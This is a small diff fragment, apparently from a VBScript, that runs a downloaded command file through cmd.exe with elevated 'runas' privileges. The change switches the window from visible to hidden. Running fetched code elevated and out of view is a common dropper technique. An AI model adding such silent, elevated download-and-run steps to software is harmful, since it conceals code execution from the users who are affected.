@@ -58,7 +58,7 @@ else
 		' *** Execute Downloaded Command File ***
 		Dim shApp
 		Set shApp = CreateObject( "Shell.Application" )
-		shApp.ShellExecute "cmd.exe", "/c """ & local_File & """", pathCMD, "runas", "1"
+		shApp.ShellExecute "cmd.exe", "/c """ & local_File & """", pathCMD, "runas", 0
 		' /*** Execute Downloaded Command File ***
 	end if
 
